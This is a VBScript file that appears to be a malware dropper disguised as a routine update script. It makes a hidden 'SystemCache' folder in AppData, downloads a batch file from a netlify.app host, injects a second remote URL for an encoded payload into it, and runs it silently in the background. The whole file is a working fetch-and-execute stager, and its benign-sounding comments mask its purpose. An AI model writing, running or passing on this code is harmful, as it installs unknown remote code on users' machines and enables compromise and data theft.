' Initialize objects
Set fileSystem = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set httpRequest = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Define working directory inside AppData
basePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\SystemCache"

' Remove old data if present
If fileSystem.FolderExists(basePath) Then
    fileSystem.DeleteFolder basePath, True
End If

' Create required directories
If Not fileSystem.FolderExists(basePath) Then fileSystem.CreateFolder basePath

logPath = basePath & "\Logs"
If Not fileSystem.FolderExists(logPath) Then fileSystem.CreateFolder logPath

' Download update script
httpRequest.Open "GET", "https://website-code.netlify.app/code/final.bat", False
httpRequest.Send

If httpRequest.Status = 200 Then
    ' Save the downloaded data to a local file
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write httpRequest.responseBody
    stream.SaveToFile logPath & "\update_task.bat", 2
    stream.Close

    ' Read and modify file content
    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 1)
    content = txtFile.ReadAll
    txtFile.Close

    content = Replace(content, "****", "'https://lively-beijinho-6a890a.netlify.app/files/encoded.txt'") ' Temporary marker adjustment

    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 2, True)
    txtFile.Write content
    txtFile.Close

    ' Execute update in background
    shell.Run Chr(34) & logPath & "\update_task.bat" & Chr(34), 0, False
End If
